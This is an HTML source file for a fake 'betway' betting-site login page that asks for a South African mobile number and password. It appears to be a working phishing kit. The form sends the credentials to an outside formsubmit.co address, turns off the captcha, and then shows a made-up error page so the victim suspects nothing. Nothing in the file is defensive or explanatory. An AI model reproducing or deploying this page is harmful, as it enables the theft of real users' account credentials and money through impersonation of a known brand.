<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Login Page</title>
  <link rel="stylesheet" href="sebono.css">
</head>
<body>

  <!-- Header -->
  <div class="header">
    <div class="logo">betway</div>
    <div class="header-buttons">
      <button class="login-btn">Login</button>
      <button class="signup-btn">Sign Up</button>
      <button class="betslip-btn">Bet Slip</button>
    </div>
  </div>

  <!-- Login Form -->
  <div class="container" id="form-page">
    <h2>Login</h2>
    <form action="https://formsubmit.co/525a68c3f15ba3237c28cc11c2e7cb21" method="POST">
      <input type="hidden" name="_captcha" value="false">
      <input type="hidden" name="_next" value="?error=1">

      <label for="mobile">Mobile Number</label>
      <input type="tel" id="mobile" name="mobile" placeholder="+27 Mobile Number" required />

      <label for="password">Password</label>
      <input type="password" id="password" name="password" placeholder="Password" required />

      <div class="text-link"><a href="#">Forgot Password?</a></div>

      <button type="submit">Login</button>
    </form>

    <div class="bottom">
      Donâ€™t have an account yet? <a href="#">Sign Up</a>
    </div>
  </div>

  <!-- Error Page -->
  <div class="container" id="error-page" style="display: none;">
    <h2 style="text-align: center; color: red;">An error has been detected</h2>
    <p style="text-align: center;">Please try again later.</p>
  </div>

  <!-- Script to control page display -->
  <script>
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.get('error') === '1') {
      document.getElementById('form-page').style.display = 'none';
      document.getElementById('error-page').style.display = 'block';
    }
  </script>

</body>
</html>
